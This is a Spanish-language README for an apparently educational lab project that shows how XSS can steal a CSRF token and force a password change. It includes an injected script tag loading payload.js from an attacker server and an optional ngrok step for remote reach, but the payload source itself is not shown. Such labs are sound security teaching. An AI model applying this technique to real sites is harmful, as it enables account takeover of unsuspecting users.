# CSRF Token Bypass via XSS (Proof of Concept)

## 🎯 Objetivo
Demostrar cómo un atacante puede evadir protección CSRF usando XSS para capturar el token legítimo y forzar un cambio de contraseña.

## 📁 Estructura del Proyecto

```
csrf-xss-bypass/
├── victim/
│   └── index.php
├── attacker/
│   ├── payload.js
│   └── server.php
```

## 🐘 Requisitos
- PHP (instalado por defecto en Kali)
- Firefox
- Ngrok (opcional para exponer atacante)

## ⚙️ Cómo ejecutar

### 1. Iniciar la víctima

```bash
php -S 127.0.0.1:8000 -t victim
```

Acceder a: http://127.0.0.1:8000

### 2. Iniciar el servidor atacante

```bash
php -S 127.0.0.1:9000 -t attacker
```

### 3. Inyectar el payload XSS

Desde consola del navegador víctima:

```html
<script src="http://127.0.0.1:9000/payload.js"></script>
```

### 4. Resultado

- El token CSRF es robado
- `server.php` lo usa para enviar un POST legítimo
- Contraseña cambiada sin interacción de la víctima

## 🌍 Opcional: Exponer con Ngrok

```bash
ngrok http 9000
```

Reemplazar la URL en `payload.js` con la de Ngrok para hacerlo accesible remotamente.

---

## ⚠️ Advertencia
Este proyecto es únicamente con fines educativos. No lo uses en sistemas sin autorización.
